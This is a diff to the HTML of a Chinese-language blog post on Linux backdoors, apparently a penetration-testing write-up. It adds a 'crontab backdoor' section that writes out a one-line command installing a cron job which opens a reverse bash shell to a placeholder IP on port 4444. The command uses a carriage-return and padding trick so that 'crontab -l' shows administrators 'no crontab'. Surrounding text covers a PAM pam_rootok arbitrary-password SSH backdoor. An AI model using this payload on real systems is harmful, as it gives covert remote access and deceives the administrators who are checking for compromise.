@@ -30,8 +30,9 @@
 <meta property="og:image" content="http://yoursite.com/img/Linux_Backdoor/anypass.jpg">
 <meta property="og:image" content="http://yoursite.com/img/Linux_Backdoor/pam.jpg">
 <meta property="og:image" content="http://yoursite.com/img/Linux_Backdoor/how-pam_rootok-work.jpg">
+<meta property="og:image" content="http://yoursite.com/img/Linux_Backdoor/crontab.jpg">
 <meta property="article:published_time" content="2020-06-04T04:03:49.000Z">
-<meta property="article:modified_time" content="2020-09-21T04:40:40.063Z">
+<meta property="article:modified_time" content="2020-09-21T05:00:11.507Z">
 <meta property="article:author" content="ph4ntom">
 <meta property="article:tag" content="渗透,后门">
 <meta name="twitter:card" content="summary">
@@ -185,7 +186,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-21 12:40:40" itemprop="dateModified" datetime="2020-09-21T12:40:40+08:00">2020-09-21</time>
+                <time title="Modified: 2020-09-21 13:00:11" itemprop="dateModified" datetime="2020-09-21T13:00:11+08:00">2020-09-21</time>
               </span>
 
           
@@ -230,7 +231,7 @@
 <p><img src="/img/Linux_Backdoor/pam.jpg" alt="pam"></p>
 <p>也就是说，只要<code>pam_rootok.so</code>模块返回true，则pam认证流程将会直接成功</p>
 <p>接着，我们就需要知道如何让<code>pam_rootok.so</code>模块返回true，通过查询相关资料，我们可以知道<code>pam_rootok.so</code>直接判断了当前的uid是否为0</p>
-<p><img src="/img/Linux_Backdoor/how-pam_rootok-work.jpg" alt="how-pam_rootok-work">women</p>
+<p><img src="/img/Linux_Backdoor/how-pam_rootok-work.jpg" alt="how-pam_rootok-work"></p>
 <p>如果你再去看看<code>pam_rootok.so</code>的源码，你会发现它使用了getuid()来判断uid</p>
 <p>而getuid()的解释原文<code>getuid() returns the real userID of the calling process</code></p>
 <p>这下就很清晰了，为何我们能够通过<code>pam_rootok.so</code>的认证，是由于调用这个模块的进程是/usr/sbin/sshd，并且这个进程是以root权限运行的，此时getuid()将返回0，这样就保证了不管输入什么密码，<code>pam_rootok.so</code>都会认证成功，从而向sshd进程返回success，通过认证阶段</p>
@@ -241,6 +242,17 @@
 <li>调用的pam模块必须包含<code>auth sufficient pam_rootok.so</code>，而符合条件的模块除了su，还有chsh，chfn，runuser</li>
 <li>创建的软链接文件的文件名必须是pam模块名，不可随意起名，因为选择模块即是基于文件名选择</li>
 </ol>
+<h2 id="crontab后门"><a href="#crontab后门" class="headerlink" title="crontab后门"></a>crontab后门</h2><p>这个怕是老生常谈了，基本上每一个管理员在意识到中毒后都会执行<code>crontab -l</code>查看一下定时任务</p>
+<p>当然，这里不会只是简单写入定时任务，这没有任何意义</p>
+<p>实际上，我们可以借助一些trick来隐藏<code>crontab -l</code>的输出，从而欺骗管理员</p>
+<p>例如，执行如下语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xxx&#x2F;4444;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
+
+<p>此时管理员如果执行<code>crontab -l</code>，将会发现没有任何异常</p>
+<p><img src="/img/Linux_Backdoor/crontab.jpg" alt="crontab"></p>
+<p>可以看到，如果用vim打开对应的计划任务文件，可以清晰看见恶意的任务，但是，当管理员执行<code>crontab -l</code>时，却只能看见<code>no crontab for xxx</code></p>
+<p>那么这是为啥呢？</p>
+<p>原理在于，<code>crontab -l</code>实际上是使用了cat命令，但是cat命令默认将会解析\r，而\r的意思是回到行首，在payload中，我们又用了<code>%100c</code>创建了100个空字符“覆盖”了恶意的payload，所以在<code>crontab -l</code>时，无法看到被“覆盖”的恶意payload，从而达到了隐藏的效果</p>
 <h2 id="各类rootkit"><a href="#各类rootkit" class="headerlink" title="各类rootkit"></a>各类rootkit</h2><p>linux rootkit算是最好用的也最强大的后门，github上有不少大师傅也开源了不少rootkit，我自己也在研究中，想自己写一个rootkit XD</p>
 <p>写完后再添加link hh</p>
 
@@ -326,7 +338,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sshd后门"><span class="nav-number">1.</span> <span class="nav-text">sshd后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-pam任意密码后门"><span class="nav-number">2.</span> <span class="nav-text">ssh pam任意密码后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各类rootkit"><span class="nav-number">3.</span> <span class="nav-text">各类rootkit</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sshd后门"><span class="nav-number">1.</span> <span class="nav-text">sshd后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-pam任意密码后门"><span class="nav-number">2.</span> <span class="nav-text">ssh pam任意密码后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crontab后门"><span class="nav-number">3.</span> <span class="nav-text">crontab后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各类rootkit"><span class="nav-number">4.</span> <span class="nav-text">各类rootkit</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
